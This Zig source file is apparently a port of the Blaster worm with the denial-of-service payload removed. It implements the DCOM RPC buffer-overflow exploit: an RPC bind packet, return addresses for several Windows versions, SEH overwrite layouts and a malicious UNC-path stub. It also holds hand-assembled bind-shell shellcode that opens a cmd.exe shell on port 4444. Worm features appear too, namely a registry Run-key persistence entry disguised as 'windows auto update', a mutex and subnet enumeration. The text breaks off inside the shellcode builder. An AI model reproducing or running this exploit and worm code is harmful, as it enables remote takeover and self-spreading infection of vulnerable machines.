//! Blaster worm port to Zig, minus the DoS payload
//! Based on decompiled Blaster worm source code analysis

const std = @import("std");

// Common Windows Types
pub const HANDLE = *anyopaque;
pub const HMODULE = HANDLE;
pub const HKEY = HANDLE;
pub const BOOL = c_int;
pub const BYTE = u8;
pub const DWORD = u32;
pub const UINT = c_uint;
pub const LONG = c_long;
pub const LPVOID = *anyopaque;
pub const LPSTR = [*:0]u8;
pub const LPCSTR = [*:0]const u8;
pub const LPDWORD = *DWORD;

pub const FALSE: BOOL = 0;
pub const NULL: ?*anyopaque = null;

// Windows Error Codes
pub const ERROR_ALREADY_EXISTS: DWORD = 0xB7;

// Registry Constants
pub const HKEY_LOCAL_MACHINE: HKEY = @ptrFromInt(0x80000002);

pub const REG_OPTION_NON_VOLATILE: DWORD = 0x00000000;

pub const KEY_ALL_ACCESS: DWORD = 0xF003F;

pub const REG_SZ: DWORD = 1;

// Kernel32 functions
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(.winapi) BOOL;

extern "kernel32" fn CreateMutexA(lpMutexAttributes: ?LPVOID, bInitialOwner: BOOL, lpName: ?LPCSTR) callconv(.winapi) ?HANDLE;

extern "kernel32" fn CreateThread(
    ?*anyopaque,
    usize,
    *const fn (?*anyopaque) callconv(.winapi) u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn TerminateThread(hThread: HANDLE, dwExitCode: DWORD) callconv(.winapi) BOOL;

extern "kernel32" fn ExitProcess(uExitCode: UINT) callconv(.winapi) noreturn;

extern "kernel32" fn GetLastError() callconv(.winapi) DWORD;

extern "kernel32" fn GetTickCount() callconv(.winapi) DWORD;

extern "kernel32" fn GetStdHandle(nStdHandle: i32) callconv(.winapi) usize;

extern "kernel32" fn WriteFile(hFile: usize, lpBuffer: [*]const u8, nNumberOfBytesToWrite: u32, lpNumberOfBytesWritten: *u32, lpOverlapped: ?*anyopaque) callconv(.winapi) i32;

extern "kernel32" fn GetModuleFileNameA(hModule: ?HMODULE, lpFilename: LPSTR, nSize: DWORD) callconv(.winapi) DWORD;

extern "kernel32" fn CreateFileA([*:0]const u8, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) usize;

extern "kernel32" fn ReadFile(usize, [*]u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;

extern "kernel32" fn WaitForSingleObject(*anyopaque, u32) callconv(.winapi) u32;

// Advapi32 functions
extern "advapi32" fn RegCloseKey(hKey: HKEY) callconv(.winapi) LONG;

extern "advapi32" fn RegCreateKeyExA(hKey: HKEY, lpSubKey: LPCSTR, Reserved: DWORD, lpClass: ?LPSTR, dwOptions: DWORD, samDesired: DWORD, lpSecurityAttributes: ?LPVOID, phkResult: *HKEY, lpdwDisposition: ?LPDWORD) callconv(.winapi) LONG;

extern "advapi32" fn RegSetValueExA(hKey: HKEY, lpValueName: ?LPCSTR, Reserved: DWORD, dwType: DWORD, lpData: [*]const BYTE, cbData: DWORD) callconv(.winapi) LONG;

// WSADATA, we don't use the result
pub const WSADATA = extern struct {
    wVersion: u16,
    wHighVersion: u16,
    szDescription: [257]u8,
    szSystemStatus: [129]u8,
    iMaxSockets: u16,
    iMaxUdpDg: u16,
    lpVendorInfo: [*]u8,
};

// Addresses are stored as four bytes in dotted-decimal order, e.g. {192,168,1,2}.
pub const IPv4 = [4]u8;

// Winsock SOCKET is pointer-sized on both x86 and x64. INVALID_SOCKET is all ones.
const invalid_socket = std.math.maxInt(usize);

// INVALID_HANDLE_VALUE is (HANDLE)-1, same all-ones bit pattern.
const invalid_handle: usize = std.math.maxInt(usize);

// Match the Windows sockaddr_in memory layout.
const sockaddr_in = extern struct {
    family: u16 = 2, // AF_INET: IPv4.

    // Port numbers in socket addresses use network byte order (big endian).
    port: u16 = std.mem.nativeToBig(u16, MSRPC_PORT),
    ip: IPv4, // Four network-order address bytes.
    padding: [8]u8 = @splat(0), // sockaddr_in's eight unused bytes.
};

// Winsock fd_setcontains a 32-bit count followed by pointer-sized SOCKETs.
const fd_set = extern struct { count: u32 = 0, sockets: [1]usize = undefined };

// Windows LONG
const timeval = extern struct { seconds: i32, microseconds: i32 };

// Winsock functions
extern "ws2_32" fn WSAStartup(u16, *anyopaque) callconv(.winapi) i32;

extern "ws2_32" fn WSACleanup() callconv(.winapi) i32;

extern "ws2_32" fn socket(i32, i32, i32) callconv(.winapi) usize;

extern "ws2_32" fn ioctlsocket(usize, i32, *u32) callconv(.winapi) i32;

extern "ws2_32" fn connect(usize, *const sockaddr_in, i32) callconv(.winapi) i32;

extern "ws2_32" fn WSAGetLastError() callconv(.winapi) i32;

extern "ws2_32" fn select(i32, ?*fd_set, ?*fd_set, ?*fd_set, *const timeval) callconv(.winapi) i32;

extern "kernel32" fn Sleep(u32) callconv(.winapi) void;

extern "ws2_32" fn send(usize, [*]const u8, i32, i32) callconv(.winapi) i32;

extern "ws2_32" fn recv(usize, [*]u8, i32, i32) callconv(.winapi) i32;

extern "ws2_32" fn bind(usize, *const sockaddr_in, i32) callconv(.winapi) i32;

extern "ws2_32" fn recvfrom(usize, [*]u8, i32, i32, *sockaddr_in, *i32) callconv(.winapi) i32;

extern "ws2_32" fn sendto(usize, [*]const u8, i32, i32, *const sockaddr_in, i32) callconv(.winapi) i32;

extern "ws2_32" fn closesocket(usize) callconv(.winapi) i32;

extern "ws2_32" fn getsockname(
    usize,
    *sockaddr_in,
    *i32,
) callconv(.winapi) i32;

// Windows MIB_IPADDRROW.
const MIB_IPADDRROW = extern struct {
    address: u32, // This computer's IPv4 address, in network byte order.
    index: u32, // Interface identifier
    mask: u32, // Subnet mask
    broadcast: u32, // Broadcast-related field
    reassembly_size: u32, // Datagram reassembly information
    unused: u16, // Reserved by Windows.
    flags: u16, // sockaddr_in state
};

const MIB_IPADDRTABLE = extern struct { count: u32, rows: [64]MIB_IPADDRROW };

// Skip unspecified addresses, loopback (127/8), zero masks, and rows for
// adapters marked disconnected (0x08) or deleted (0x40).
fn subnetEligible(row: MIB_IPADDRROW) bool {
    const address = std.mem.bigToNative(u32, row.address);
    return address != 0 and address >> 24 != 127 and
        std.mem.bigToNative(u32, row.mask) != 0 and row.flags & 0x48 == 0;
}

extern "iphlpapi" fn GetIpAddrTable(*MIB_IPADDRTABLE, *u32, i32) callconv(.winapi) u32;

/// avoid libc dependency
pub const panic = std.debug.FullPanic(panicExit);

fn panicExit(_: []const u8, _: ?usize) noreturn {
    ExitProcess(1);
}

// logging
fn dbg(comptime fmt: []const u8, args: anytype) void {
    var buf: [512]u8 = undefined;
    const msg = std.fmt.bufPrint(&buf, "[blaster] " ++ fmt ++ "\n", args) catch return;

    const stdout = GetStdHandle(-11); // STD_OUTPUT_HANDLE
    if (stdout != 0 and stdout != invalid_handle) {
        var written: u32 = 0;
        _ = WriteFile(stdout, msg.ptr, @intCast(msg.len), &written, null);
    }
}

// ip fmt helper
const DottedIp = struct {
    ip: IPv4,
    pub fn format(self: DottedIp, w: *std.Io.Writer) std.Io.Writer.Error!void {
        try w.print("{d}.{d}.{d}.{d}", .{ self.ip[0], self.ip[1], self.ip[2], self.ip[3] });
    }
};

fn dotted(ip: IPv4) DottedIp {
    return .{ .ip = ip };
}

/// Block until the operator presses Enter so console logs stay readable.
fn awaitEnter() void {
    dbg("press enter to continue...", .{});

    const stdin = GetStdHandle(-10); // STD_INPUT_HANDLE
    if (stdin == 0 or stdin == invalid_handle) return;

    var byte: [1]u8 = undefined;
    var read: u32 = 0;
    while (true) {
        if (ReadFile(stdin, &byte, 1, &read, null) == 0) return;
        if (read == 0) return;
        if (byte[0] == '\r' or byte[0] == '\n') break;
    }
}

/// Blaster Constants
pub const MSRPC_PORT: u16 = 135;
pub const TFTP_PORT: u16 = 69;
pub const SHELL_PORT: u16 = 4444;

pub const MUTEX_NAME = "BILLY";
pub const REG_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
pub const REG_VALUE = "windows auto update";

/// Global state
pub var msblast_filename: [256 + 4:0]u8 = undefined;

pub const payload_space: usize = 880;
pub const payload_min_nops: usize = 300;
pub const payload_bad_chars = [_]u8{ 0x00, 0x0a, 0x0d, 0x5c, 0x5f, 0x2f, 0x2e };

// Return addresses for various windows versions
const rets: [7]u32 = .{
    0x77f33723, // Windows NT 4.0 SP6a (esp) — layout filler, see appendUncPath
    0x7ffde0eb, // Windows 2000 writable address + jmp+0xe0
    0x010016c6, // Windows 2000 Universal (ebx)
    0x01001c59, // Windows XP SP0/SP1 (pop pop ret)
    0x001b0b0b, // Windows 2003 call near [ebp+0x30] (unicode.nls)
    0x776a240d, // Windows NT 4.0 SP5 (eax) ws2help.dll
    0x74ff16f3, // Windows NT 4.0 SP3/4 (pop pop ret) rnr20.dll
};

// Sent first, RPCSS must accept the bind (see receiveBindAck) before the exploit PDU.
// Selects DCOM activation interface 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57
// with the NDR transfer syntax. The crafted activation arguments follow later
// in a separate request
pub const dcerpc_bind_pdu = [_]u8{
    0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00,
    0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
    0xb8, 0x4a, 0x9f, 0x4d, 0x1c, 0x7d, 0xcf, 0x11,
    0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,
    0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a,
    0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,
    0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,
};

// jmp_short (EB imm8) is relative to the *end* of the instruction
fn jmpShort(displacement: i8) [2]u8 {
    return .{ 0xeb, @bitCast(displacement) };
}

// Rex::Arch::X86.jmp_short("$+N") / ("$-N") subtracts 2 from the offset.
fn jmpShortFromStart(offset_from_instruction_start: i32) [2]u8 {
    return jmpShort(@intCast(offset_from_instruction_start - 2));
}

const Rng = std.Random.SplitMix64;

fn appendRandText(w: *std.Io.Writer, rng: *Rng, count: usize) !void {
    // Count accepted bytes so rejected characters cannot shrink
    // a block and shift the control-flow fields that follow it.
    var written: usize = 0;
    while (written < count) {
        const c: u8 = @truncate(rng.next());
        if (std.mem.indexOfScalar(u8, &payload_bad_chars, c) != null) continue;
        try w.writeByte(c);
        written += 1;
    }
}

fn appendRandAlphanumeric(w: *std.Io.Writer, rng: *Rng, count: usize) !void {
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (0..count) |_| {
        try w.writeByte(alphabet[rng.next() % alphabet.len]);
    }
}

// NT 4.0 SEH/return block. The jmpbacks are relative to the fully padded
// payload and must stay exactly 118 bytes.
// This block follows the payload directly, the two target-specific entry
// paths use backward branches to return to its NOP sled.
fn appendNtShiz(w: *std.Io.Writer, payload_len: usize, rng: *Rng) !void {
    const start = w.end;

    // jmp +17 over the two NT return addresses; two random padding bytes follow.
    try w.writeAll(&jmpShortFromStart(12 + 5));
    try appendRandText(w, rng, 2);

    std.mem.writeInt(u32, try w.writableArray(4), rets[6], .little);
    std.mem.writeInt(u32, try w.writableArray(4), rets[5], .little);

    // NT 4.0 SP5 jmpback: -(5 + 4 + payload_len), relative to the end of its jmp.
    try w.writeByte(0xe9);
    const sp5_disp: u32 = 0 -% @as(u32, @intCast(5 + 4 + payload_len));
    std.mem.writeInt(u32, try w.writableArray(4), sp5_disp, .little);

    // NT 4.0 SP3/SP4 jmpback: -(12 + 5 + 5 + payload_len).
    try w.writeByte(0xe9);
    const sp3_disp: u32 = 0 -% @as(u32, @intCast(12 + 5 + 5 + payload_len));
    std.mem.writeInt(u32, try w.writableArray(4), sp3_disp, .little);

    const written = w.end - start;
    std.debug.assert(written <= 118);
    try appendRandText(w, rng, 118 - written);
}

// The Windows XP SEH chain. xpseh[314] computes the payload start from
// [esp-4] - 1312
// The same 360-byte region also contains the Windows 2003 path. Offsets below
// are relative to this region
fn appendXpSeh(w: *std.Io.Writer, rng: *Rng) !void {
    const start = w.end;
    try appendRandAlphanumeric(w, rng, 360);

    const seh = w.buffer[start..w.end];
    std.debug.assert(seh.len == 360);

    const jmpsc = [_]u8{
        0x8b, 0x44, 0x24, 0xfc, // mov eax, [esp-0x4]
        0x05, 0xe0, 0xfa, 0xff, 0xff, // add eax, 0xfffffae0 (sub eax, 1312)
        0xff, 0xe0, // jmp eax
    };
    const jmpsc2k3 = [_]u8{
        0x8b, 0x45, 0x30, // mov eax, [ebp+0x30]
        0x05, 0x24, 0xfb, 0xff, 0xff, // add eax, 0xfffffb24 (sub eax, 1244)
        0xff, 0xe0, // jmp eax
    };

    // Windows 2003 uses an EBP-relative pointer. Place its recovery code before
    // the short backward branch and its target address in the following slot.
    @memcpy(seh[246 - jmpsc2k3.len ..][0..jmpsc2k3.len], &jmpsc2k3);
    seh[246..][0..2].* = jmpShortFromStart(-@as(i32, @intCast(jmpsc2k3.len)));
    std.mem.writeInt(u32, seh[250..][0..4], rets[4], .little);

    // XP's overwritten SEH record has a Next field at 306 and Handler at 310.
    // Exception dispatch reaches the pop/pop/ret handler, the short branch in
    // Next skips the handler address and reaches the recovery code at 314.
    seh[306..][0..2].* = jmpShortFromStart(8);
    std.mem.writeInt(u32, seh[310..][0..4], rets[3], .little);
    @memcpy(seh[314..][0..jmpsc.len], &jmpsc);
}

// Prepend Space - encoded.length NOPs, so the payload occupies the
// full 880-byte space and the XP jmpsc lands on it.
fn buildPayload(comptime shellcode: []const u8) [payload_space]u8 {
    if (shellcode.len > payload_space) @compileError("shellcode exceeds payload space");
    const nop_count = payload_space - shellcode.len;
    if (nop_count < payload_min_nops) @compileError("not enough room for the NOP sled");

    // Right-align the supplied shellcode so its end and all following blocks
    // stay fixed as its length changes. The remaining prefix is the NOP sled.
    var result: [payload_space]u8 = undefined;
    @memset(result[0..nop_count], 0x90);
    @memcpy(result[nop_count..], shellcode);
    return result;
}

// The evil UNC path (see https://www.exploit-db.com/exploits/16749)
// The delimiters are widened here, body is already a byte-oriented
// layout
fn appendUncPath(w: *std.Io.Writer, payload: []const u8, rng: *Rng) !void {
    // Two UTF-16LE backslashes select the vulnerable UNC-path handling
    // Subsequent bytes are laid out in the order copied to the stack.
    try appendUtf16LeBytes(w, "\\\\");
    try w.splatByteAll(0x90, 32);

    // NT 4.0 jumps over the Windows 2000/XP return addresses.
    try w.writeAll(&jmpShort(16));
    try w.writeAll(&jmpShort(25));

    std.mem.writeInt(u32, try w.writableArray(4), rets[2], .little); // Windows 2000 (ebx)
    std.mem.writeInt(u32, try w.writableArray(4), rets[0], .little); // NT 4.0 SP6 (esi)
    std.mem.writeInt(u32, try w.writableArray(4), rets[1], .little); // 2000 writable / NT jump

    // NOPs and short branches form the entry "walker" leading to the payload
    try w.splatByteAll(0x90, 88);
    try w.writeAll(&jmpShort(4));
    try appendRandText(w, rng, 4);
    try w.splatByteAll(0x90, 8);
    try w.writeAll(&jmpShort(4));
    try w.writeAll(&jmpShort(4));
    try w.splatByteAll(0x90, 4);
    try w.writeAll(&jmpShort(4));
    try appendRandText(w, rng, 4);

    // Preserve the contiguous payload / NT block / XP-and-2003 block ordering:
    // the recovery branches above depend on these blocks' sizes and positions.
    try w.writeAll(payload);
    try appendNtShiz(w, payload.len, rng);
    try appendXpSeh(w, rng);
    // A final wide backslash and wide NUL close and terminate the path.
    try appendUtf16LeBytes(w, "\\\x00");
}

fn appendUtf16LeBytes(w: *std.Io.Writer, bytes: []const u8) !void {
    for (bytes) |byte| {
        try w.writeByte(byte);
        try w.writeByte(0);
    }
}

// Length of the NDR stub: header/trailer fields wrapping the UNC path, padded
// to 4-byte (NDR pointer) alignment.
pub fn StubData(comptime payload_len: usize) type {
    const uncpath_len = 650 + payload_len;
    const stub_len = 116 + uncpath_len + ((4 - (uncpath_len & 3)) & 3);
    return [stub_len]u8;
}

// The NDR stub driving RPCSS into the vulnerable char copy
pub fn buildStubData(
    comptime payload: []const u8,
    comptime seed: u64,
) std.Io.Writer.Error!StubData(payload.len) {
    @setEvalBranchQuota(1000000);

    var result: StubData(payload.len) = undefined;
    var w = std.Io.Writer.fixed(&result);
    var rng = Rng{ .s = seed };

    const uncpath_len = 650 + payload.len;
    var uncpath: [uncpath_len]u8 = undefined;
    var uncpath_w = std.Io.Writer.fixed(&uncpath);
    try appendUncPath(&uncpath_w, payload, &rng);
    std.debug.assert(uncpath_w.end == uncpath_len);

    std.mem.writeInt(u16, try w.writableArray(2), 5, .little);
    std.mem.writeInt(u16, try w.writableArray(2), 1, .little);
    std.mem.writeInt(u32, try w.writableArray(4), 0, .little);
    std.mem.writeInt(u32, try w.writableArray(4), 0, .little);
    try appendRandText(&w, &rng, 16);
    for (0..5) |_| std.mem.writeInt(u32, try w.writableArray(4), 0, .little);
    std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);

    // NDR varying string: max count (in UTF-16 code units), starting offset, actual count (UTF-16
    // code units)
    const pad = (4 - (uncpath_len & 3)) & 3;
    std.mem.writeInt(u32, try w.writableArray(4), @intCast(uncpath_len / 2), .little);
    std.mem.writeInt(u32, try w.writableArray(4), 0, .little);
    std.mem.writeInt(u32, try w.writableArray(4), @intCast(uncpath_len / 2), .little);
    try w.writeAll(&uncpath);
    // Align the trailing stub fields without including padding in either count.
    try w.splatByteAll(0, pad);

    std.mem.writeInt(u32, try w.writableArray(4), 0, .little);
    std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);
    std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);
    std.mem.writeInt(u32, try w.writableArray(4), 1, .little);
    std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);
    std.mem.writeInt(u32, try w.writableArray(4), 1, .little);
    for (0..4) |_| std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);
    std.mem.writeInt(u32, try w.writableArray(4), 1, .little);
    std.mem.writeInt(u32, try w.writableArray(4), 1, .little);
    std.mem.writeInt(u32, try w.writableArray(4), @truncate(rng.next()), .little);

    std.debug.assert(w.end == result.len);
    return result;
}

// Length of the Request PDU: NDR stub wrapped in the 24-byte RPC header.
pub fn RequestPdu(comptime stub_len: usize) type {
    if (stub_len + 24 > std.math.maxInt(u16)) @compileError("stub data is too large");
    return [stub_len + 24]u8;
}

// DCERPC Request PDU wrapping the stub (same as Metasploit's dcerpc_call).
pub fn buildRequestPdu(
    comptime stubdata: []const u8,
    comptime call_id: u32,
) std.Io.Writer.Error!RequestPdu(stubdata.len) {
    var result: RequestPdu(stubdata.len) = undefined;
    var w = std.Io.Writer.fixed(&result);

    // RPC header: version 5.0, request packet, first+last fragment
    try w.writeAll(&[_]u8{ 5, 0, 0, 3, 0x10, 0, 0, 0 });
    std.mem.writeInt(u16, try w.writableArray(2), @intCast(stubdata.len + 24), .little);
    std.mem.writeInt(u16, try w.writableArray(2), 0, .little);
    std.mem.writeInt(u32, try w.writableArray(4), call_id, .little);
    // Request-specific fields: allocation hint (stub bytes), presentation
    // context 0 from the bind, and operation 0, followed by the NDR arguments.
    std.mem.writeInt(u32, try w.writableArray(4), @intCast(stubdata.len), .little);
    std.mem.writeInt(u16, try w.writableArray(2), 0, .little);
    std.mem.writeInt(u16, try w.writableArray(2), 0, .little);
    try w.writeAll(stubdata);

    std.debug.assert(w.end == result.len);
    return result;
}

// The bind shell dropped by the exploit, honestly this is just a copy of the msfvenom flow, I
// didn't come up with this, decided to include it here instead of an opaque shellcode bin as it reflects Zig's strengths and
// it's more transparent
const ShellcodeAsm = struct {
    const Label = struct { name: []const u8, pos: usize };
    const Fixup = struct { pos: usize, name: []const u8 };

    buf: [1024]u8 = undefined,
    len: usize = 0,
    labels: [4]Label = undefined,
    label_count: usize = 0,
    fixups: [32]Fixup = undefined,
    fixup_count: usize = 0,

    fn emit(b: *ShellcodeAsm, bytes: []const u8) void {
        @memcpy(b.buf[b.len..][0..bytes.len], bytes);
        b.len += bytes.len;
    }

    fn emitByte(b: *ShellcodeAsm, byte: u8) void {
        b.buf[b.len] = byte;
        b.len += 1;
    }

    fn emitImm32(b: *ShellcodeAsm, value: u32) void {
        inline for (0..4) |i| {
            b.emitByte(@truncate(value >> (8 * i)));
        }
    }

    fn label(b: *ShellcodeAsm, name: []const u8) void {
        b.labels[b.label_count] = .{ .name = name, .pos = b.len };
        b.label_count += 1;
    }

    // call rel32 to a label
    fn callTo(b: *ShellcodeAsm, name: []const u8) void {
        b.emitByte(0xe8);
        b.emitImm32(0);
        b.fixups[b.fixup_count] = .{ .pos = b.len - 4, .name = name };
        b.fixup_count += 1;
    }

    fn finish(b: *ShellcodeAsm) []const u8 {
        for (b.fixups[0..b.fixup_count]) |fixup| {
            var found = false;
            for (b.labels[0..b.label_count]) |l| {
                if (std.mem.eql(u8, l.name, fixup.name)) {
                    const rel: u32 = @bitCast(@as(i32, @intCast(l.pos)) - @as(i32, @intCast(fixup.pos + 4)));
                    inline for (0..4) |i| {
                        b.buf[fixup.pos + i] = @truncate(rel >> (8 * i));
                    }
                    found = true;
                }
            }
            if (!found) @compileError("unresolved fixup label: " ++ fixup.name);
        }
        return b.buf[0..b.len];
    }

    // ror13 hash used by find_function: for each character of the API name,
    // rotate the accumulator right by 13 bits and add the byte. For example
    // hash("LoadLibraryA") == 0xec0e4e8e, hash("WSASocketA") == 0xadf509d9.
    fn apiHash(b: *ShellcodeAsm, comptime name: []const u8) u32 {
        _ = b;
        comptime {
            var hash: u32 = 0;
            for (name) |c| {
                hash = std.math.rotr(u32, hash, 13) +% c;
            }
            return hash;
        }
    }

    // Push a NUL-terminated string onto the stack as 4-byte little-endian
    // chunks, last chunk first, so the bytes end up in order in memory.
    // E.g. "cmd.exe" pushes 0x00657865 ("exe\0") then 0x2e646d63 ("cmd.").
    fn pushStringZ(b: *ShellcodeAsm, comptime s: []const u8) void {
        const padded_len = (s.len + 1 + 3) / 4 * 4;
        var padded: [padded_len]u8 = @splat(0);
        @memcpy(padded[0..s.len], s);
        var i: usize = padded_len / 4;
        while (i > 0) {
            i -= 1;
            b.emitByte(0x68); // push imm32
            var value: u32 = 0;
            for (0..4) |j| {
                value |= @as(u32, padded[i * 4 + j]) << (8 * j);
            }
            b.emitImm32(value);
        }
    }

    // Resolve one API: push the module base from its table slot, push the
    // ror13 hash of the API name, call find_function and store the result in
    // the table. module_slot 0 selects kernel32, 4 selects ws2_32.
    fn resolveApi(b: *ShellcodeAsm, comptime module_slot: u8, comptime name: []const u8, comptime table_slot: u8) void {
        if (module_slot == 0) {
            b.emit(&.{ 0xff, 0x36 }); // push [esi] ; kernel32 base
        } else {
            b.emit(&.{ 0xff, 0x76, module_slot }); // push [esi+module_slot] ; ws2_32 base
        }
        b.emitByte(0x68); // push imm32
        b.emitImm32(b.apiHash(name));
        b.callTo("find_function");
        b.emit(&.{ 0x89, 0x46, table_slot }); // mov [esi+table_slot], eax
    }
};

// Main body: builds the API table on the stack and drives the bind shell.
// ESI points at a 0x34-byte table frame: +00 kernel32 base, +04 ws2_32 base,
// +08..+2c resolved API pointers, +30 pointer to the command line string.
fn shellcodeBlockMain(b: *ShellcodeAsm) void {
    b.emit(&.{ 0x83, 0xec, 0x34 }); // sub esp, 0x34 ; reserve the API table
    b.emit(&.{ 0x8b, 0xf4 }); // mov esi, esp ; ESI = &table
    b.callTo("kernel32"); // call find_kernel32
    b.emit(&.{ 0x89, 0x06 }); // mov [esi], eax ; table+00 = kernel32 base

    b.resolveApi(0, "LoadLibraryA", 0x08); // table+08 = LoadLibraryA
    b.resolveApi(0, "WaitForSingleObject", 0x0c); // table+0c = WaitForSingleObject

    b.pushStringZ("ws2_32.dll"); // push "ws2_32.dll\0"
    b.emit(&.{0x54}); // push esp ; lpLibFileName
    b.emit(&.{ 0xff, 0x56, 0x08 }); // call [esi+0x08] ; LoadLibraryA("ws2_32.dll")
    b.emit(&.{ 0x89, 0x46, 0x04 }); // mov [esi+0x04], eax ; table+04 = ws2_32 base

    b.resolveApi(0, "CreateProcessA", 0x10); // table+10 = CreateProcessA
    b.resolveApi(0, "ExitProcess", 0x14); // table+14 = ExitProcess
    b.resolveApi(4, "WSAStartup", 0x18); // table+18 = WSAStartup
    b.resolveApi(4, "WSASocketA", 0x1c); // table+1c = WSASocketA
    b.resolveApi(4, "bind", 0x20); // table+20 = bind
    b.resolveApi(4, "listen", 0x24); // table+24 = listen
    b.resolveApi(4, "accept", 0x28); // table+28 = accept
    b.resolveApi(4, "closesocket", 0x2c); // table+2c = closesocket

    b.emit(&.{ 0x33, 0xff }); // xor edi, edi ; EDI = 0, reused as a NULL argument
    b.emit(&.{ 0x81, 0xec, 0x90, 0x01, 0x00, 0x00 }); // sub esp, 0x190 ; room for the WSAData structure
    b.emit(&.{0x54}); // push esp ; lpWSAData
    b.emit(&.{ 0x68, 0x01, 0x01, 0x00, 0x00 }); // push 0x101 ; wVersionRequested = 1.1
    b.emit(&.{ 0xff, 0x56, 0x18 }); // call [esi+0x18] ; WSAStartup(0x101, &WSAData)
    b.emit(&.{0x50}); // push eax ; protocol = 0 (eax is 0 on success)
    b.emit(&.{0x50}); // push eax ; lpProtocolInfo = NULL
    b.emit(&.{0x50}); // push eax ; dwFlags = 0
    b.emit(&.{0x50}); // push eax ; gGroup = 0
    b.emit(&.{0x40}); // inc eax ; eax = 1
    b.emit(&.{0x50}); // push eax ; SOCK_STREAM
    b.emit(&.{0x40}); // inc eax ; eax = 2
    b.emit(&.{0x50}); // push eax ; AF_INET
    b.emit(&.{ 0xff, 0x56, 0x1c }); // call [esi+0x1c] ; WSASocketA(2, 1, 0, 0, 0, 0)
    b.emit(&.{ 0x8b, 0xd8 }); // mov ebx, eax ; EBX = listening socket
    b.emit(&.{0x57}); // push edi ; sin_zero high dword = 0
    b.emit(&.{0x57}); // push edi ; sin_zero low dword = 0
    b.emit(&.{ 0x68, 0x02, 0x00, 0x11, 0x5c }); // push 0x5c110002 ; sin_port = htons(4444), sin_family = AF_INET
    b.emit(&.{ 0x8b, 0xcc }); // mov ecx, esp ; ECX = &sockaddr_in
    b.emit(&.{ 0x6a, 0x16 }); // push 0x16 ; namelen = 22
    b.emit(&.{0x51}); // push ecx ; lpSockAddr
    b.emit(&.{0x53}); // push ebx ; s
    b.emit(&.{ 0xff, 0x56, 0x20 }); // call [esi+0x20] ; bind(s, &addr, 22)
    b.emit(&.{0x57}); // push edi ; backlog = 0
    b.emit(&.{0x53}); // push ebx ; s
    b.emit(&.{ 0xff, 0x56, 0x24 }); // call [esi+0x24] ; listen(s, 0)
    b.emit(&.{0x57}); // push edi ; lpaddrlen = NULL
    b.emit(&.{0x51}); // push ecx ; lpSockAddr (reused scratch)
    b.emit(&.{0x53}); // push ebx ; s
    b.emit(&.{ 0xff, 0x56, 0x28 }); // call [esi+0x28] ; accept(s, &addr, NULL)
    b.emit(&.{ 0x8b, 0xd0 }); // mov edx, eax ; EDX = client socket
    b.pushStringZ("cmd.exe"); // push "cmd.exe\0"
    b.emit(&.{ 0x89, 0x66, 0x30 }); // mov [esi+0x30], esp ; table+30 = "cmd.exe"
    b.emit(&.{ 0x83, 0xec, 0x54 }); // sub esp, 0x54 ; PROCESS_INFORMATION (0x10) + STARTUPINFO (0x44)
    b.emit(&.{ 0x8d, 0x3c, 0x24 }); // lea edi, [esp] ; EDI = &PROCESS_INFORMATION
    b.emit(&.{ 0x33, 0xc0 }); // xor eax, eax
    b.emit(&.{ 0x33, 0xc9 }); // xor ecx, ecx
    b.emit(&.{ 0x83, 0xc1, 0x15 }); // add ecx, 0x15 ; 21 dwords = 0x54 bytes
    b.emit(&.{0xab}); // stosd ; zero both structures
    b.emit(&.{ 0xe2, 0xfd }); // loop -3 ; back to stosd until ECX wraps to 0
    b.emit(&.{ 0xc6, 0x44, 0x24, 0x10, 0x44 }); // mov byte [esp+0x10], 0x44 ; STARTUPINFO.cb = 0x44
    b.emit(&.{ 0xfe, 0x44, 0x24, 0x3d }); // inc byte [esp+0x3d] ; dwFlags |= STARTF_USESTDHANDLES (0x100)
    b.emit(&.{ 0x89, 0x54, 0x24, 0x48 }); // mov [esp+0x48], edx ; STARTUPINFO.hStdInput = client socket
    b.emit(&.{ 0x89, 0x54, 0x24, 0x4c }); // mov [esp+0x4c], edx ; STARTUPINFO.hStdOutput = client socket
    b.emit(&.{ 0x89, 0x54, 0x24, 0x50 }); // mov [esp+0x50], edx ; STARTUPINFO.hStdError = client socket
    b.emit(&.{ 0x8d, 0x44, 0x24, 0x10 }); // lea eax, [esp+0x10] ; EAX = &STARTUPINFO
    b.emit(&.{0x54}); // push esp ; lpProcessInformation
    b.emit(&.{0x50}); // push eax ; lpStartupInfo
    b.emit(&.{0x51}); // push ecx ; lpCurrentDirectory = NULL
    b.emit(&.{0x51}); // push ecx ; lpEnvironment = NULL
    b.emit(&.{0x51}); // push ecx ; dwCreationFlags = 0
    b.emit(&.{ 0x6a, 0x01 }); // push 1 ; bInheritHandles = TRUE
    b.emit(&.{0x51}); // push ecx ; lpThreadAttributes = NULL
    b.emit(&.{0x51}); // push ecx ; lpProcessAttributes = NULL
    b.emit(&.{ 0xff, 0x76, 0x30 }); // push [esi+0x30] ; lpCommandLine = "cmd.exe"
    b.emit(&.{0x51}); // push ecx ; lpApplicationName = NULL
    b.emit(&.{ 0xff, 0x56, 0x10 }); // call [esi+0x10] ; CreateProcessA(NULL, "cmd.exe", ...)
